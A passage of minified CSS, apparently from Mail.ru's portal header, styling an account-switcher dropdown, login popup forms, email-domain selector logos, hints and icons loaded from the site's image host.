-40px}.x-ph__menu__dropdown_auth{text-align:left;white-space:normal;min-width:310px;max-width:220%}.x-ph-no-box-shadow .x-ph__menu__dropdown_auth{z-index:1011}.w-w-x-ph__menu__dropdown_auth{margin:-1px}.x-ph-no-box-shadow .w-w-x-ph__menu__dropdown_auth{margin:0}.x-ph__menu__dropdown_auth__loader{display:none;position:relative;outline:none;overflow:hidden;height:150px;background:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/loader.gif") no-repeat center center}.x-ph__menu__dropdown_auth_loading .x-ph__menu__dropdown_auth__loader{display:block}.x-ph__menu__dropdown_auth__error{display:none;position:relative;height:16px;outline:none;overflow:hidden;background:#fefbd6;color:#db130c;font:normal 12px/16px "Helvetica Neue",Arial,sans-serif;padding:68px 18px 66px;text-align:center;background:none}.x-ph__menu__dropdown_auth_error .x-ph__menu__dropdown_auth__error{display:block}.x-ph__auth_list{display:block;overflow:hidden}.x-ph__auth_list_scroll{overflow-y:scroll}.x-ph__menu__dropdown_auth_error .x-ph__auth_list,.x-ph__menu__dropdown_auth_loading .x-ph__auth_list{display:none}.x-ph__auth_list__item{position:relative;display:block;outline:none;overflow:hidden;cursor:pointer;height:40px;line-height:40px;padding:12px 12px 12px 62px;border-top:1px solid #efefef}.x-ph__auth_list__item:first-child{border:0}.x-ph__auth_list_active .x-ph__auth_list__item{position:relative;border-top:0;padding:12px 12px 8px 72px;height:50px;line-height:50px}.x-ph__auth_list_active .x-ph__auth_list__item__avatar{height:50px;width:50px;-webkit-border-radius:25px;border-radius:25px;top:12px;left:12px}.x-ph__auth_list_active .x-ph__auth_list__item__avatar__social,.x-ph__auth_list_active .x-ph__auth_list__item__avatar__camera{height:24px;width:24px;position:absolute;display:block;-webkit-border-radius:12px;border-radius:12px;right:-5px;bottom:-5px}.x-ph__auth_list_active .x-ph__auth_list__item__avatar__camera{background-color:#f7f7f7}.x-ph__auth_list_active .x-ph__auth_list__item__avatar__camera:hover{background-color:#1378bf}.x-ph__auth_list_active .x-ph__auth_list__item__avatar__social:after,.x-ph__auth_list_active .x-ph__auth_list__item__avatar__camera:after{position:absolute;top:0;left:0}.x-ph__auth_list_active .x-ph__auth_list__item__avatar__camera:before{display:none;position:absolute;background:none !important;border:2px solid #1378bf;height:49px;width:49px;-webkit-border-radius:27px;border-radius:27px;top:-32px;left:-32px;content:' '}.x-ph__auth_list_active .x-ph__auth_list__item__avatar__camera:hover:before{display:block}.x-ph__auth_list_active .x-ph__auth_list__item__logout{top:0;padding:0;margin-left:10px}.x-ph__menu__dropdown_auth_social .x-ph__auth_list_active{border-bottom:1px solid #DEDEDE}.x-ph__menu__dropdown_auth_social .x-ph__auth_list_active .x-ph__auth_list__item_current{padding-bottom:15px}.x-ph__auth_list__item_last{margin-bottom:0}.x-ph__auth_list__item:link,.x-ph__auth_list__item:visited,.x-ph__auth_list__item:hover,.x-ph__auth_list__item:focus,.x-ph__auth_list__item:active{background:#f2f2f2}.x-ph__auth_list__item_current,.x-ph__auth_list__item_current:link,.x-ph__auth_list__item_current:visited,.x-ph__auth_list__item_current:hover,.x-ph__auth_list__item_current:focus,.x-ph__auth_list__item_current:active{background:#f7f7f7;cursor:default}.x-ph__auth_list__item__avatar{position:absolute;background-position:50% 50%;background-size:contain;background-repeat:no-repeat;-webkit-border-radius:22px;border-radius:22px;top:12px;left:12px;height:40px;width:40px}.w-x-ph__auth_list__item__info{overflow:hidden;height:100%}.x-ph__auth_list__item__info{width:100%;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap;padding:0;vertical-align:middle;display:inline-block}.x-ph__auth_list__item__info__email{float:left;max-width:100%;overflow:hidden;padding-top:2px}.x-ph-ff .x-ph__auth_list__item__info__email{float:none}.x-ph__auth_list__item:hover .x-ph__auth_list__item__info__email,.x-ph__auth_list__item:focus .x-ph__auth_list__item__info__email,.x-ph__auth_list__item:active .x-ph__auth_list__item__info__email,.x-ph__auth_list__item_current .x-ph__auth_list__item__info__email,.x-ph__auth_list__item_current:link .x-ph__auth_list__item__info__email,.x-ph__auth_list__item_current:visited .x-ph__auth_list__item__info__email,.x-ph__auth_list__item_current:hover .x-ph__auth_list__item__info__email,.x-ph__auth_list__item_current:focus .x-ph__auth_list__item__info__email,.x-ph__auth_list__item_current:active .x-ph__auth_list__item__info__email{color:#333}.x-ph__auth_list__item__info__email__text{display:block;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;font:15px/20px "Helvetica Neue",Arial,sans-serif;color:#333}.x-ph__auth_list__item__info__logout{padding:2px 0;margin-top:7px;color:#1378bf}.x-ph__auth_list__item__info__email__counter{display:none;float:right;position:relative;padding-left:9px;font:13px/17px "Helvetica Neue",Arial,sans-serif;top:13px}.x-ph-ff.x-ph-win .x-ph__auth_list__item__info__email__counter{top:0}.x-ph__auth_list__item__info__email__counter_visible{display:block}.x-ph__auth_list__item__info__email__counter__icon{display:inline-block;width:16px;height:16px;margin-bottom:-4px;background:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/auth/icons.gif") no-repeat 0 -70px;background-size:27px auto;vertical-align:baseline;background-position:0 -106px;width:19px;margin-right:4px}.x-ph__auth_list__item__info__email__counter__text{color:#333;font:13px/18px "Helvetica Neue",Arial,sans-serif}.x-ph__auth_list__item__info__text{width:100%;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;color:#808080;font:13px/18px "Helvetica Neue",Arial,sans-serif}.x-ph__auth_list__item_current .x-ph__auth_list__item__info__text,.x-ph__auth_list__item_current:link .x-ph__auth_list__item__info__text,.x-ph__auth_list__item_current:visited .x-ph__auth_list__item__info__text,.x-ph__auth_list__item_current:hover .x-ph__auth_list__item__info__text,.x-ph__auth_list__item_current:focus .x-ph__auth_list__item__info__text,.x-ph__auth_list__item_current:active .x-ph__auth_list__item__info__text{color:#666}.x-ph__auth_list__item__logout{display:none;color:#1378bf;float:right;position:relative;padding:3px 5px 0;margin-right:-3px;opacity:0}.x-ph__auth_list__item__logout:hover{color:#f26d00}.x-ph-not-desk .x-ph__auth_list__item__logout{display:block;opacity:1}.x-ph__auth_list__item:hover .x-ph__auth_list__item__logout,.x-ph__auth_list__item:focus .x-ph__auth_list__item__logout,.x-ph__auth_list__item:active .x-ph__auth_list__item__logout{display:block;opacity:1}.x-ph__auth_list__item:hover .x-ph__auth_list__item__info__email__counter_visible,.x-ph__auth_list__item:focus .x-ph__auth_list__item__info__email__counter_visible,.x-ph__auth_list__item:active .x-ph__auth_list__item__info__email__counter_visible{display:none}.x-ph__auth_list__item .x-ph__auth_list__item__logout:hover,.x-ph__auth_list__item .x-ph__auth_list__item__logout:focus,.x-ph__auth_list__item .x-ph__auth_list__item__logout:active{display:block;opacity:1}.x-ph__auth_list__item_current .x-ph__auth_list__item__logout,.x-ph__auth_list__item_current:link .x-ph__auth_list__item__logout,.x-ph__auth_list__item_current:visited .x-ph__auth_list__item__logout,.x-ph__auth_list__item_current:hover .x-ph__auth_list__item__logout,.x-ph__auth_list__item_current:focus .x-ph__auth_list__item__logout,.x-ph__auth_list__item_current:active .x-ph__auth_list__item__logout{display:block;opacity:1}.x-ph__menu__dropdown_auth__login{border-top:1px solid #dedede;margin-top:-1px;padding:12px;position:relative}.x-ph__menu__dropdown_auth_error .x-ph__menu__dropdown_auth__login,.x-ph__menu__dropdown_auth_loading .x-ph__menu__dropdown_auth__login,.x-ph__menu_auth_multi_limit .x-ph__menu__dropdown_auth__login{display:none}.x-ph__menu__dropdown_auth__login__link,.x-ph__menu__dropdown_auth__login__link:link,.x-ph__menu__dropdown_auth__login__link:visited,.x-ph__menu__dropdown_auth__login__link:hover,.x-ph__menu__dropdown_auth__login__link:active,.x-ph__menu__dropdown_auth__login__link:focus{display:block;max-width:310px;height:30px;margin:0 auto;color:#fff;outline:none;font:15px/30px "Helvetica Neue",Arial,sans-serif;text-align:center;text-decoration:none;padding:0}.x-ph__menu__dropdown_auth__login__link .x-ph__button__fake{display:block;font-family:"Helvetica Neue",Arial,sans-serif}.x-ph__menu__dropdown_auth__login__link .x-ph__button__fake__text{display:block;width:100%;overflow:hidden;text-overflow:ellipsis}.x-ph__menu__dropdown_auth__info{position:relative;text-align:center;font:12px/18px "Helvetica Neue",Arial,sans-serif;color:#666}.x-ph__menu__dropdown_auth_error .x-ph__menu__dropdown_auth__info,.x-ph__menu__dropdown_auth_loading .x-ph__menu__dropdown_auth__info,.x-ph__menu_auth_multi .x-ph__menu__dropdown_auth__info{display:none}.x-ph__menu__dropdown_auth__info__arrow{display:none;position:absolute;top:-11px;left:24px;width:27px;height:23px;background:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/auth/icons.gif") no-repeat 0 -40px;background-size:27px auto}.x-ph__menu__dropdown_auth__info__link,.x-ph__menu__dropdown_auth__info__link:link,.x-ph__menu__dropdown_auth__info__link:visited,.x-ph__menu__dropdown_auth__info__link:hover,.x-ph__menu__dropdown_auth__info__link:focus,.x-ph__menu__dropdown_auth__info__link:active{display:block;font:13px/16px "Helvetica Neue",Arial,sans-serif;text-align:center;margin-bottom:12px;text-decoration:none}.x-ph__menu__dropdown_auth__info__link .x-ph__menu__dropdown_auth__info__link__text,.x-ph__menu__dropdown_auth__info__link:link .x-ph__menu__dropdown_auth__info__link__text,.x-ph__menu__dropdown_auth__info__link:visited .x-ph__menu__dropdown_auth__info__link__text,.x-ph__menu__dropdown_auth__info__link:hover .x-ph__menu__dropdown_auth__info__link__text,.x-ph__menu__dropdown_auth__info__link:focus .x-ph__menu__dropdown_auth__info__link__text,.x-ph__menu__dropdown_auth__info__link:active .x-ph__menu__dropdown_auth__info__link__text{color:#666;text-decoration:none}.x-ph__menu__dropdown_auth__info__link .x-ph__menu__dropdown_auth__info__link__link,.x-ph__menu__dropdown_auth__info__link:link .x-ph__menu__dropdown_auth__info__link__link,.x-ph__menu__dropdown_auth__info__link:visited .x-ph__menu__dropdown_auth__info__link__link,.x-ph__menu__dropdown_auth__info__link:hover .x-ph__menu__dropdown_auth__info__link__link,.x-ph__menu__dropdown_auth__info__link:active .x-ph__menu__dropdown_auth__info__link__link,.x-ph__menu__dropdown_auth__info__link:focus .x-ph__menu__dropdown_auth__info__link__link{color:#1378bf;outline:none;white-space:nowrap;text-decoration:none}.x-ph__menu__dropdown_auth__info__link:hover .x-ph__menu__dropdown_auth__info__link__link,.x-ph__menu__dropdown_auth__info__link:active .x-ph__menu__dropdown_auth__info__link__link,.x-ph__menu__dropdown_auth__info__link:focus .x-ph__menu__dropdown_auth__info__link__link{color:#f26d00}.x-ph__menu__dropdown_auth__links{background:#f7f7f7;padding-left:61px;border-bottom:1px solid #dedede}.x-ph__menu__dropdown_auth_social .x-ph__menu__dropdown_auth__links,.x-ph__menu__dropdown_auth_error .x-ph__menu__dropdown_auth__links,.x-ph__menu__dropdown_auth_loading .x-ph__menu__dropdown_auth__links{display:none}.x-ph__menu__dropdown_auth__links__link{display:block;margin:0;padding:7px 12px;height:15px;font:13px/15px "Helvetica Neue",Arial,sans-serif}.x-ph__menu__dropdown_auth__links__link:link,.x-ph__menu__dropdown_auth__links__link:visited{color:#333;text-decoration:none}.x-ph__menu__dropdown_auth__links__link:hover,.x-ph__menu__dropdown_auth__links__link:focus,.x-ph__menu__dropdown_auth__links__link:active{background:#dedede;text-decoration:none}.x-ph__menu__dropdown_auth__links__link__text{display:block;width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.x-ph__menu__dropdown_auth__links__sep{border-top:1px solid #dedede}.x-ph__overlay{display:none;position:fixed;_position:absolute;top:0;left:0;z-index:10000;width:100%;height:100%;background:#000;opacity:0.4;filter:alpha(opacity=40)}.x-ph__overlay_visible{display:block}.w-x-ph__popup{display:none;font:0/0 a;height:0}.w-x-ph__popup_visible{display:block;position:absolute;left:0;top:0;width:100%;height:100%;z-index:10001}.w-x-ph__popup__layout{position:absolute;top:0;left:0;z-index:10001;width:100%;height:100%;font:13px/16px Arial,sans-serif;border-spacing:0;border:0}.w-x-ph__popup__layout__valign{padding:0;vertical-align:middle}.x-ph__popup{position:relative;margin:0 auto;width:320px;color:#222;background:#fff;border:1px solid #d9d9d9;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:0 4px 9px rgba(0,0,0,0.3);-moz-box-shadow:0 4px 9px rgba(0,0,0,0.3);box-shadow:0 4px 9px rgba(0,0,0,0.3)}.w-x-ph__popup__title{padding:25px 25px 15px}.x-ph__popup__title{width:100%;color:#000;font:18px/22px Arial,sans-serif;-o-text-overflow:ellipsis;text-overflow:ellipsis;overflow:hidden;white-space:nowrap}.x-ph__popup__content{position:relative;padding:0 25px 20px}.x-ph__popup__content__preloader{display:none;position:absolute;top:0;left:0;z-index:10;width:100%;height:100%;background-color:#fff;background-color:rgba(255,255,255,0.9);background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/loader.gif");background-repeat:no-repeat;background-position:center center}.x-ph__popup__content_preloader_visible .x-ph__popup__content__preloader{display:block}.x-ph__popup__footer{padding:14px 25px 15px;border-top:1px solid #e5e5e5;-webkit-border-radius:0 0 4px 4px;-moz-border-radius:0 0 4px 4px;border-radius:0 0 4px 4px;background:#f2f2f2}.x-ph__popup__footer__controls{width:100%;height:30px;line-height:30px}.x-ph__popup__footer__controls__col:after{content:' ';display:inline-block;height:30px;line-height:30px;vertical-align:middle;visibility:hidden}.x-ph__popup__footer__controls__col_left{float:left;text-align:left;padding-right:10px}.x-ph__popup__footer__controls__col_right{display:block;overflow:hidden;text-align:right}.x-ph__popup__footer__controls__item{margin-right:17px;vertical-align:middle}.x-ph__popup__footer__controls__item_last{margin-right:0}.x-ph__popup__footer__controls__item_link,.x-ph__popup__footer__controls__item_link:link,.x-ph__popup__footer__controls__item_link:visited,.x-ph__popup__footer__controls__item_link:hover,.x-ph__popup__footer__controls__item_link:focus,.x-ph__popup__footer__controls__item_link:active{display:inline-block;max-width:100%;overflow:hidden;color:#000;font-size:13px;cursor:pointer;text-decoration:none;white-space:nowrap;-o-text-overflow:ellipsis;text-overflow:ellipsis}.x-ph__popup__footer__controls__item_link:hover,.x-ph__popup__footer__controls__item_link:focus,.x-ph__popup__footer__controls__item_link:active{color:#f37823}.x-ph__popup__footer__controls__item_link__text{text-decoration:underline}.x-ph__popup__footer__controls__item__text{color:#000;font-size:13px}.x-ph__popup__close{position:absolute;top:0;right:0;width:32px;height:32px;cursor:pointer}.x-ph__popup__close__icon{margin-top:18px;margin-left:8px;width:8px;height:8px;text-indent:-999em;background:url(//img.imgsmail.ru/p/popup/close.v2.png) no-repeat 0 0;overflow:hidden}.x-ph__popup__close:hover .x-ph__popup__close__icon,.x-ph__popup__close:focus .x-ph__popup__close__icon,.x-ph__popup__close:active .x-ph__popup__close__icon{background-position:0 -9px}.w-x-ph__form__row{margin-bottom:20px;position:relative}.w-x-ph__form__row_last{margin-bottom:0}.w-x-ph__form__row_oauth{display:none;height:62px;overflow:hidden}.w-x-ph__form__row__col{display:inline-block;width:50%}.w-x-ph__form__row__col_left{text-align:left}.w-x-ph__form__row__col_right{text-align:right}.x-ph__form__link,.x-ph__form__link:link,.x-ph__form__link:visited,.x-ph__form__link:hover,.x-ph__form__link:active,.x-ph__form__link:focus{color:#1378bf;text-decoration:none;font:12px/16px Arial,sans-serif}.x-ph__form__link:hover,.x-ph__form__link:focus,.x-ph__form__link:active{color:#f26d00}.x-ph__form__select{position:relative;display:block;cursor:default;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;user-select:none}.x-ph__form__select__element{position:absolute;max-width:100%;height:26px;left:0;right:0;top:0;bottom:0;opacity:0;z-index:2;-webkit-appearance:menulist-button;filter:alpha(opacity=0)}.x-ph__form__select__box{display:block;width:100%;height:26px;padding:4px 20px 2px 9px;font:12px/16px Arial,sans-serif;color:#333;border:1px solid #c6c6c6;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;background-color:#ededed;background-image:-webkit-linear-gradient(top, #fff, #ededed);background-image:-moz-linear-gradient(top, #fff, #ededed);background-image:-o-linear-gradient(top, #fff, #ededed);background-image:-ms-linear-gradient(top, #fff, #ededed);background-image:linear-gradient(to bottom, #fff, #ededed);white-space:nowrap}.x-ph__form__select_hover .x-ph__form__select__box{background-color:#f4f4f4;background-image:-webkit-linear-gradient(top, #fff, #f4f4f4);background-image:-moz-linear-gradient(top, #fff, #f4f4f4);background-image:-o-linear-gradient(top, #fff, #f4f4f4);background-image:-ms-linear-gradient(top, #fff, #f4f4f4);background-image:linear-gradient(to bottom, #fff, #f4f4f4);outline:none}.x-ph__form__select_focus .x-ph__form__select__box{background-color:#d8dadc;background-image:-webkit-linear-gradient(top, #fff, #d8dadc);background-image:-moz-linear-gradient(top, #fff, #d8dadc);background-image:-o-linear-gradient(top, #fff, #d8dadc);background-image:-ms-linear-gradient(top, #fff, #d8dadc);background-image:linear-gradient(to bottom, #fff, #d8dadc);outline:none}.x-ph__form__select_hover .x-ph__form__select__box,.x-ph__form__combo_hover .x-ph__form__select__box{border-color:#999}.x-ph__form__select_focus .x-ph__form__select__box,.x-ph__form__combo_focus .x-ph__form__select__box{border-color:#85b8eb}.x-ph__form__select_error .x-ph__form__select__box,.x-ph__form__combo_error .x-ph__form__select__box{border-color:#ce1900}.x-ph__form__select__box__text{display:block;overflow:hidden;text-overflow:ellipsis}.x-ph__form__select__arrow{display:block;position:absolute;top:11px;right:8px;border-color:#000 transparent transparent;border-style:solid;border-width:4px 4px 0;z-index:1}.x-ph__form__input{display:block;cursor:text;position:relative;z-index:2;overflow:hidden;border:1px solid #c6c6c6;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px;-webkit-box-shadow:inset 1px 1px 4px rgba(0,0,0,0.17);-moz-box-shadow:inset 1px 1px 4px rgba(0,0,0,0.17);box-shadow:inset 1px 1px 4px rgba(0,0,0,0.17);background:#fff;float:none;top:0;margin:0}.w-x-ph__form__input{display:block;position:relative;height:24px;padding-right:12px;overflow:hidden}.x-ph__form__input__placeholder{display:none;position:absolute;top:5px;left:7px;color:#999;-webkit-user-select:none;-moz-user-select:none;user-select:none;white-space:nowrap;font:13px/16px Arial,sans-serif}.x-ph__form__input__text{display:block;width:100%;height:16px;margin:0;padding:4px 6px;-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;border:0;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;color:#333;font:13px/16px Arial,sans-serif;background:none;outline:none;cursor:text}.x-ph__form__input_hover,.x-ph__form__combo_hover .x-ph__form__input{border-color:#999}.x-ph__form__input_focus,.x-ph__form__combo_focus .x-ph__form__input{border-color:#85b8eb}.x-ph__form__input_error,.x-ph__form__combo_error .x-ph__form__input{border-color:#ce1900 !important}.x-ph__form__input__text::-webkit-input-placeholder{color:#999}.x-ph__form__input__text:-moz-placeholder{color:#999}.x-ph__form__combo .x-ph__form__input{overflow:hidden}.x-ph__form__combo .x-ph__form__input{-webkit-border-top-right-radius:0;-webkit-border-bottom-right-radius:0;-moz-border-radius-topright:0;-moz-border-radius-bottomright:0;border-top-right-radius:0;border-bottom-right-radius:0;border-right-color:#c6c6c6}.x-ph__form__combo .x-ph__form__select{float:right;max-width:50%}.x-ph__form__combo .x-ph__form__select__box{-webkit-border-top-left-radius:0;-webkit-border-bottom-left-radius:0;-moz-border-radius-topleft:0;-moz-border-radius-bottomleft:0;border-top-left-radius:0;border-bottom-left-radius:0;border-left:0}.x-ph__form__checkbox{width:12px;height:12px;position:relative;display:inline-block;margin-bottom:-2px}.x-ph__form__checkbox__input{position:absolute;z-index:2;top:0px;left:0;width:100%;height:100%;margin:0;opacity:0;filter:alpha(opacity=0);outline:0}.x-ph__form__checkbox__checkmark{position:absolute;z-index:1;width:10px;height:10px;border-width:1px;border-style:solid;border-color:#999;font:0/0 a;border-radius:2px;background-color:#fefefe}.x-ph__form__checkbox_focus .x-ph__form__checkbox__checkmark{border-color:#85b8eb}.x-ph__form__checkbox_hover .x-ph__form__checkbox__checkmark{border-color:#333}.x-ph__form__checkbox__checkmark__v{display:none;position:absolute;z-index:1;top:-1px;left:0px;width:14px;height:10px;border:0;background:transparent url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/authForm/icons.png") no-repeat 0 0;background-size:20px auto}.x-ph__form__checkbox_checked .x-ph__form__checkbox__checkmark__v{display:block}.x-ph__form__label{font:12px/16px Arial,sans-serif;color:#999;-webkit-user-select:none;-moz-user-select:none;user-select:none;float:none;top:0;margin:0}.x-ph__form__message{display:none;color:#999999;font:12px/16px Arial,sans-serif}.x-ph__form__message_error{color:#ea0000}.x-ph__form__message_oauth{display:block;color:#333}.x-ph__popup_authForm{width:396px}.x-ph__form__checkbox{margin-right:6px}.x-ph__authForm__domains{display:none;border-bottom:1px solid #f2f2f2}.x-ph__authForm__domains__list{text-align:justify;font-size:2px}.x-ph__authForm__domains__list__leg{display:inline-block;height:18px;width:80%;overflow:hidden}.x-ph__authForm__domains__list__item{display:inline-block;height:26px;border:1px solid transparent;padding:2px;overflow:hidden;vertical-align:middle;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px;background-position:50% 50%;background-repeat:no-repeat;color:#000;font:13px/18px Arial,sans-serif;text-align:center;cursor:pointer}.x-ph__authForm__domains__list__item_selected,.x-ph__authForm__domains__list__item_selected:link,.x-ph__authForm__domains__list__item_selected:visited,.x-ph__authForm__domains__list__item_selected:hover,.x-ph__authForm__domains__list__item_selected:focus,.x-ph__authForm__domains__list__item_selected:active,.x-ph__authForm__domains__list__item:hover,.x-ph__authForm__domains__list__item:focus,.x-ph__authForm__domains__list__item:active{background-color:#fff;-webkit-box-shadow:0 1px 1px rgba(0,0,0,0.1);-moz-box-shadow:0 1px 1px rgba(0,0,0,0.1);box-shadow:0 1px 1px rgba(0,0,0,0.1);outline:none}.x-ph__authForm__domains__list__item:hover{border-color:#ececec}.x-ph__authForm__domains__list__item:focus,.x-ph__authForm__domains__list__item:active{border-color:#85b8eb}.x-ph__authForm__domains__list__item_selected,.x-ph__authForm__domains__list__item_selected:link,.x-ph__authForm__domains__list__item_selected:visited,.x-ph__authForm__domains__list__item_selected:hover,.x-ph__authForm__domains__list__item_selected:focus,.x-ph__authForm__domains__list__item_selected:active{border-color:#c7c7c7;cursor:default}.x-ph__authForm__domains__list__item_selected:focus,.x-ph__authForm__domains__list__item_selected:active{border-color:#85b8eb}.x-ph__authForm__domains__list__item_other{text-indent:0}.x-ph__authForm__domains__list__item_external{display:none}.w-x-ph__authForm__domains__list__item{display:inline-block;vertical-align:middle;padding:4px;background-position:50% 50%;background-repeat:no-repeat;height:18px}.w-x-ph__authForm__domains__list__item_mailru{padding-right:6px;padding-left:6px;border-radius:2px;width:62px;background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/authForm/logo/mail.ru.png");background-color:#168de2;background-size:62px 13px}.w-x-ph__authForm__domains__list__item_yandexru{width:45px;background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/authForm/logo/yandex.ru.png");background-size:45px 17px}.w-x-ph__authForm__domains__list__item_ramblerru{width:59px;background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/authForm/logo/rambler.ru.png");background-size:59px 18px}.w-x-ph__authForm__domains__list__item_gmailcom{width:48px;background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/authForm/logo/gmail.com.png");background-size:48px 17px}@media only screen and (-webkit-min-device-pixel-ratio: 1.25), only screen and (min--moz-device-pixel-ratio: 1.25), only screen and (-o-min-device-pixel-ratio: 2 / 1.6), only screen and (min-device-pixel-ratio: 2), only screen and (min-resolution: 120dpi), only screen and (min-resolution: 1.25dppx){.w-x-ph__authForm__domains__list__item_mailru{background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/authForm/logo/mail.ru@x2.png")}.w-x-ph__authForm__domains__list__item_yandexru{background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/authForm/logo/yandex.ru@x2.png")}.w-x-ph__authForm__domains__list__item_ramblerru{background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/authForm/logo/rambler.ru@x2.png")}.w-x-ph__authForm__domains__list__item_gmailcom{background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/authForm/logo/gmail.com@x2.png")}}.x-ph__authForm__domains__list__item__image{vertical-align:middle}.x-ph__authForm__domains__list__item__leg{display:inline-block;text-indent:-1000px}.x-ph__authForm__domains__list__item__text{display:inline-block;font:13px/13px Arial,sans-serif;border-bottom:1px dotted #000}.x-ph__authForm__domains__list__item_other .x-ph__authForm__domains__list__item__text{position:relative;top:1px}.x-ph__authForm__changeAuth{display:block;margin-top:-1px;text-align:right}.x-ph__authForm__changeAuth__text{display:inline-block;margin-right:8px;vertical-align:middle;color:#000;font:13px/30px Arial,sans-serif}.x-ph__authForm__changeAuth__email{display:inline-block;vertical-align:middle}.w-x-ph__authForm__changeAuth__email{display:inline-block;max-width:160px}.x-ph__form__password__icon{width:20px;height:20px;position:relative;float:right;top:2px;overflow:hidden;vertical-align:baseline;font:0/0 a;display:block;background:transparent url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/authForm/icons.png") no-repeat;background-size:20px 88px}.x-ph__form__password__icon_warning{margin:0 2px 0 0;cursor:default;background-position:2px -21px}.x-ph__form__password__icon_eye{cursor:pointer;background-position:2px -62px;margin:0 4px 0 0}.x-ph__form__password__icon_eye-show{background-position:2px -40px}@-webkit-keyframes x-ph-flash{0%, 50%, 100%{opacity:1}25%, 75%{opacity:0}}@-moz-keyframes x-ph-flash{0%, 50%, 100%{opacity:1}25%, 75%{opacity:0}}@-o-keyframes x-ph-flash{0%, 50%, 100%{opacity:1}25%, 75%{opacity:0}}@keyframes x-ph-flash{0%, 50%, 100%{opacity:1}25%, 75%{opacity:0}}.x-ph-animated_flash{-webkit-animation-name:x-ph-flash;-moz-animation-name:x-ph-flash;-o-animation-name:x-ph-flash;animation-name:x-ph-flash}.x-ph-hint{display:none;position:absolute;z-index:1000;padding:5px 7px;color:#fff;background:#000;background:rgba(0,0,0,0.8);border:1px solid #ccc}.x-ph-box-shadow .x-ph-hint{border-color:#fff}.x-ph-hint_white{background:#fff;background:rgba(255,255,255,0.9);color:#665d4c}.x-ph-hint_iframe{margin:0;padding:0;overflow:hidden}.x-ph-hint_auth{top:100%;margin-top:10px;right:0;display:block;background:#fff;color:#333;border-radius:4px;box-shadow:0 0 8px #cbcbcb;box-shadow:0 0 8px rgba(0,0,0,0.3);padding:13px 17px}.x-ph-box-shadow .x-ph-hint__tip{position:absolute;width:0px;height:0px;overflow:hidden;font-size:0;border:solid transparent}.x-ph-box-shadow .x-ph-hint__tip_bottom{left:16px;top:100%;border-top-color:#000;border-top-color:rgba(0,0,0,0.8);border-width:7px 7px 0}.x-ph-box-shadow .x-ph-hint__tip_top{left:16px;bottom:100%;border-bottom-color:#000;border-bottom-color:rgba(0,0,0,0.8);border-width:0 7px 7px}.x-ph-box-shadow .x-ph-hint__tip_white_bottom{left:16px;top:100%;border-top-color:#fff;border-top-color:rgba(255,255,255,0.8);border-width:7px 7px 0}.x-ph-box-shadow .x-ph-hint__tip_white_top{left:16px;bottom:100%;border-bottom-color:#fff;border-bottom-color:rgba(255,255,255,0.8);border-width:0 7px 7px}.x-ph-box-shadow .x-ph-hint__tip_whited_top_right{right:16px;bottom:100%;border-bottom-color:#fff;border-width:0 7px 7px}.x-ph-hint__content{font-size:12px;white-space:nowrap}.x-ph-hint__close{top:5px;right:5px;position:absolute;padding-top:2px;height:18px;width:20px;cursor:pointer;text-align:center}.x-ph-promo{display:block;position:relative;height:0;right:-10px;top:0;margin-right:4px}.x-ph__promo{padding:4px 25px 4px 55px;min-height:32px;text-align:left}.x-ph__promo_exit{background:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/promo/promo_exit.png") 0 0 no-repeat;background-size:40px 40px}@media only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (min--moz-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3 / 2), only screen and (min-device-pixel-ratio: 1.5){.x-ph__promo_exit{background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/promo/promo_exit@2x.png")}}.x-ph__promo_region{background:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/promo/promo_region.png") 0 0 no-repeat;background-size:40px 40px}@media only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (min--moz-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3 / 2), only screen and (min-device-pixel-ratio: 1.5){.x-ph__promo_region{background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/promo/promo_region@2x.png")}}.x-ph-ico:after{display:inline-block;height:24px;width:24px;background:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/ico/ico.png") repeat-x;background-size:138px 238px;content:""}@media only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (min--moz-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3 / 2), only screen and (min-device-pixel-ratio: 1.5){.x-ph-ico:after{background-size:70px 119px}}.x-ph-ico:hover:after{content:" "}.x-ph-ico:focus:after{content:"  "}.x-ph-ico:active:after{content:"   "}.x-ph-ico:visited:after{content:"    "}.x-ph-ico_camera:after{background-position:5px 3px}@media only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (min--moz-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3 / 2), only screen and (min-device-pixel-ratio: 1.5){.x-ph-ico_camera:after{background-position:4px -15px}}.x-ph-ico_camera:hover:after{background-position:5px -87px}@media only screen and 